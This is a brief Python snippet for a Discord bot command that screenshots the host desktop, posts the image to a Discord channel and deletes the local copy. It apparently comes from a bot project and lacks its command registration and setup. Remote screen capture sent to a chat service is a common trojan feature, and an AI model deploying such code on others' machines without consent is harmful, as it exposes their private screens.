import discord
from discord.ext import commands
import pyautogui
import os

async def screenshot(ctx):
    try:
        # Take a screenshot of the desktop
        screenshot_path = 'screenshot.png'
        pyautogui.screenshot(screenshot_path)
        
        # Send the screenshot to Discord
        file = discord.File(screenshot_path, filename='screenshot.png')
        await ctx.send("Here is the screenshot:", file=file)
        
        # Clean up: Delete the temporary screenshot file
        os.remove(screenshot_path)
    
    except Exception as e:
        await ctx.send(f"Failed to take or send screenshot: {e}")
